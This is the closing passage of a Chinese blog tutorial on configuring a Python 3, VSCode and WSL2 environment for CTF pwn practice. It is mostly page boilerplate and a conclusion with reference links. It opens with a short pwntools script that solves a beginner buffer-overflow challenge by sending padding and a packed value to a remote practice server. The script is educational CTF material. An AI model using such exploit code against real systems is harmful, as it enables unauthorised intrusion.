+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="number">111.198</span><span class="number">.29</span><span class="number">.45</span>, <span class="number">49252</span>)</span><br><span class="line">r.recvuntil(<span class="string">"bof"</span>) </span><br><span class="line">r.sendline(<span class="string">b'AAAA'</span> + p64(<span class="number">1853186401</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>体会过上面几个题你应该有了感觉，pwn就是在看似做不到的事情中寻求那一点突破。这地方不行，那我就从另一个地方到达，看似不可写实则可读可写（菜鸡愚见）。</p>
+<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这套环境突出一个方便快捷，WSL2我这性能羸弱的机器也只需要3-5秒就能启动，exp写完直接就能在VSCode里得出结果，文件交互也比较流畅，不需要VMtools。有问题就是现在WSL2与VMware不兼容，不知道这个问题解决了没有。</p>
+<p>写的时候我自己都觉得我啰嗦，我觉得我写的还是比较细致了，但我相信还是零基础看还是不太可能一下子弄明白，毕竟我也是零基础入门，当然我现在也是菜的也批。我看零基础pwn入门之类的文章时也看不懂，其实pwn零基础是真的不能入门也学不懂的，这也是一些人吐槽网上的pwn教程对新手真的不是特别友好，造成pwn入门门槛偏高的原因之一 吧。关于到底怎么入门，就像yuange说的（大意）：我就是看汇编语言，操作系统，计算机原理等。</p>
+<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p>1.<a href="https://github.com/giantbranch/pwn-env-init" target="_blank" rel="noopener">https://github.com/giantbranch/pwn-env-init</a></p>
+<p>2.<a href="https://blog.csdn.net/baidu_36804484/article/details/88803846" target="_blank" rel="noopener">https://blog.csdn.net/baidu_36804484/article/details/88803846</a></p>
+<p>3.<a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Thanks for reward</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wx.png" alt="fe1yu 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpg" alt="fe1yu 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    fe1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/" title="py3+VSCode+WSL2的pwn环境配置与使用">https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/10/123/" rel="next" title="123">
+                <i class="fa fa-chevron-left"></i> 123
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODMwOC8yNDgwMg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/joker.jpg"
+                alt="fe1yu" />
+            
+              <p class="site-author-name" itemprop="name">fe1yu</p>
+              <p class="site-description motion-element" itemprop="description">三思而行，及时止损</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="root@fe1yu.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-WSL2的安装"><span class="nav-text">0x01 WSL2的安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Linux的配置"><span class="nav-text">0x02 Linux的配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-VSCode的安装及使用"><span class="nav-text">0x03 VSCode的安装及使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-简单实战"><span class="nav-text">0x04 简单实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-get-shell"><span class="nav-text">0x00 get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CGfsb"><span class="nav-text">0x01 CGfsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-when-did-you-born"><span class="nav-text">0x02 when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-hello-pwn"><span class="nav-text">0x03 hello_pwn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-总结"><span class="nav-text">0x05 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-参考链接"><span class="nav-text">0x06 参考链接</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+		  
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fe1yu</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+<div class="theme-info">
+	<div class="powered-by">
+	<span class="post-count">博客全站共6.1k字</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 阅读量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+	
+
+    
+
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+</body>
+</html>
